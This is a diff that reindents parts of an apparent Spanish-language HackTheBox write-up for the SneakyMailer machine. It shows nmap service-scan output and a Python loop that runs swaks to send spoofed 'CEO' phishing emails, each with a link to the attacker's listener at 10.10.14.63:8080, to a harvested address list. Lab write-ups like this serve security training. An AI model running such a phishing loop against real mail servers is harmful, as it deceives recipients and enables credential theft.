@@ -34,38 +34,37 @@ Acá nos damos cuenta de varias cosas bastante útiles, la primera es que está 
 ```console
 
 Nmap scan report for 10.10.10.197
-	PORT     STATE SERVICE  VERSION
-	21/tcp   open  ftp      vsftpd 3.0.3
-	22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-	| ssh-hostkey: 
-	|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
-	|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
-	|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
-	25/tcp   open  smtp     Postfix smtpd
-	|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
-	80/tcp   open  http     nginx 1.14.2
-	|_http-server-header: nginx/1.14.2
-	|_http-title: Did not follow redirect to http://sneakycorp.htb
-	143/tcp  open  imap     Courier Imapd (released 2018)
-	|_imap-capabilities: IDLE ENABLE SORT OK ACL QUOTA IMAP4rev1 THREAD=ORDEREDSUBJECT THREAD=REFERENCES CAPABILITY NAMESPACE UTF8=ACCEPTA0001 completed CHILDREN STARTTLS ACL2=UNION UIDPLUS
-	| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
-	| Subject Alternative Name: email:postmaster@example.com
-	| Not valid before: 2020-05-14T17:14:21
-	|_Not valid after:  2021-05-14T17:14:21
-	|_ssl-date: TLS randomness does not represent time
-	993/tcp  open  ssl/imap Courier Imapd (released 2018)
-	|_imap-capabilities: IDLE ENABLE SORT OK ACL AUTH=PLAIN QUOTA IMAP4rev1 THREAD=ORDEREDSUBJECT THREAD=REFERENCES CAPABILITY NAMESPACE UTF8=ACCEPTA0001 completed CHILDREN ACL2=UNION UIDPLUS
-	| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
-	| Subject Alternative Name: email:postmaster@example.com
-	| Not valid before: 2020-05-14T17:14:21
-	|_Not valid after:  2021-05-14T17:14:21
-	|_ssl-date: TLS randomness does not represent time
-	8080/tcp open  http     nginx 1.14.2
-	|_http-open-proxy: Proxy might be redirecting requests
-	|_http-server-header: nginx/1.14.2
-	|_http-title: Welcome to nginx!
-	Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-	
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
+|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
+|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
+25/tcp   open  smtp     Postfix smtpd
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
+80/tcp   open  http     nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Did not follow redirect to http://sneakycorp.htb
+143/tcp  open  imap     Courier Imapd (released 2018)
+|_imap-capabilities: IDLE ENABLE SORT OK ACL QUOTA IMAP4rev1 THREAD=ORDEREDSUBJECT THREAD=REFERENCES CAPABILITY NAMESPACE UTF8=ACCEPTA0001 completed CHILDREN STARTTLS ACL2=UNION UIDPLUS
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+993/tcp  open  ssl/imap Courier Imapd (released 2018)
+|_imap-capabilities: IDLE ENABLE SORT OK ACL AUTH=PLAIN QUOTA IMAP4rev1 THREAD=ORDEREDSUBJECT THREAD=REFERENCES CAPABILITY NAMESPACE UTF8=ACCEPTA0001 completed CHILDREN ACL2=UNION UIDPLUS
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+8080/tcp open  http     nginx 1.14.2
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome to nginx!
+Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 Ok, agregamos el nuevo dominio al archivo hosts y exploramos un poco a ver que nos encontramos.
@@ -156,10 +155,10 @@ lista_emails = leer_emails("emails.txt")
 n = 1
 
 for emails in lista_emails:
-	    print "\n[{}] -- Enviando Phishing a [{}]".format(n,emails) 
-	    comando = 'swaks -from "ceo@sneakymailer.htb" -body " http://10.10.14.63:8080" --to ' + emails + " -server 10.10.10.197 -header 'Subject: Importante' > /dev/null " 
-	    os.system(comando)
-	    n+=1
+	print "\n[{}] -- Enviando Phishing a [{}]".format(n,emails) 
+	comando = 'swaks -from "ceo@sneakymailer.htb" -body " http://10.10.14.63:8080" --to ' + emails + " -server 10.10.10.197 -header 'Subject: Importante' > /dev/null " 
+	os.system(comando)
+	n+=1
 
 ```
 
